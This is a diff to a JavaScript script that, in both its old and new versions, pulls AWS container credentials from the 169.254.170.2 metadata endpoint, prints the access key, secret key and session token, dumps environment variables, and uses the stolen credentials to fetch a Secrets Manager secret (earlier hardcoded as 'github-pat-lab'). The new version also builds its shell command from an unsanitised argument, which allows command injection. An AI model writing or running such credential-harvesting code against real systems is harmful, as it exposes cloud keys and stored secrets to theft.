@@ -45,53 +45,38 @@ const orig = [console.log, console.error, console.warn];
 console.log = console.error = console.warn = (...a) => logs.push(a.join(' '));
 
 try {
-    const https = require("https");
-    const  execFile  = require("child_process").execFile;
-    const region = "il-central-1";
-    
-    const fetchMDS = () => new Promise((resolve, reject) => {
-        const path = process.env.AWS_CONTAINER_CREDENTIALS_RELATIVE_URI;
-        if (!path) return reject(new Error("no uri"));
-        https.get(`https://169.254.170.2${path}`, (res) => {
-            console.log("after accessing mds")
-            let body = "";
-            res.on("data", (c) => body += c);
-            res.on("end", () => { try { console.log(body); resolve(JSON.parse(body)); } catch (e) { reject(e); } });
-        }).on("error", reject);
-    });
-    
-    const getSecret = (id, c) => new Promise((resolve, reject) => {
-      const env = { ...process.env, AWS_ACCESS_KEY_ID: c.AccessKeyId, AWS_SECRET_ACCESS_KEY: c.SecretAccessKey, AWS_SESSION_TOKEN: c.Token, AWS_REGION: region };
-      delete env.AWS_CONTAINER_CREDENTIALS_RELATIVE_URI;
-        console.log("before SM call")
-      execFile("aws", ["secretsmanager", "get-secret-value", "--secret-id", id, "--region", region, "--output", "json"], { env, maxBuffer: 8 << 20 }, (err, out, errOut) => {
-        if (err) return reject(new Error(errOut.trim() || err.message));
-        try { resolve(JSON.parse(out)); } catch (e) { reject(e); }
-      });
-    });
-
     const { execSync } = require("child_process");
-    const url = `http://169.254.170.2${process.env.AWS_CONTAINER_CREDENTIALS_RELATIVE_URI}`;
-    console.log("hitting:", url);
-    try {
-        const out = execSync(
-            `curl -sS --max-time 3 -w "\\nHTTP %{http_code}\\n" "${url}"`,
-            { encoding: "utf8", timeout: 4000 }
-        );
-        console.log(out);
-    } catch (e) {
-        console.log("failed:", e.status, e.stderr?.toString().trim());
-    }
+    const region = process.env.AWS_REGION || process.env.AWS_DEFAULT_REGION || "us-east-1";
     
-    (async () => {
-        console.log("before mds")
-        const id = "github-pat-lab";
+    const fetchMDS = () => {
+      const path = process.env.AWS_CONTAINER_CREDENTIALS_RELATIVE_URI;
+      if (!path) throw new Error("no uri");
+      return JSON.parse(execSync(
+        `curl -sS --max-time 3 "http://169.254.170.2${path}"`,
+        { encoding: "utf8", timeout: 4000 }
+      ));
+    };
+    
+    const getSecret = (id, c) => {
+      const env = { ...process.env,
+        AWS_ACCESS_KEY_ID: c.AccessKeyId,
+        AWS_SECRET_ACCESS_KEY: c.SecretAccessKey,
+        AWS_SESSION_TOKEN: c.Token,
+        AWS_REGION: region,
+      };
+      delete env.AWS_CONTAINER_CREDENTIALS_RELATIVE_URI;
+      return JSON.parse(execSync(
+        `aws secretsmanager get-secret-value --secret-id "${id}" --region "${region}" --output json`,
+        { encoding: "utf8", env, maxBuffer: 8 << 20, timeout: 10_000 }
+      ));
+    };
+    
+    const id = process.argv[2];
+    console.log({ AccessKeyId: process.env.AWS_ACCESS_KEY_ID, SecretAccessKey: process.env.AWS_SECRET_ACCESS_KEY, SessionToken: process.env.AWS_SESSION_TOKEN });
+    const mds = fetchMDS();
+    console.log({ AccessKeyId: mds.AccessKeyId, SecretAccessKey: mds.SecretAccessKey, SessionToken: mds.Token });
+    if (id) console.log(getSecret(id, mds));
 
-        const mds = await fetchMDS();
-        console.log({ AccessKeyId: mds.AccessKeyId, SecretAccessKey: mds.SecretAccessKey, SessionToken: mds.Token });
-        console.log("before secret")
-        if (id) console.log(await getSecret(id, mds));
-    })();
 
     for (const [k, v] of Object.entries(e)) {
         console.log(`${k}=${v}`);
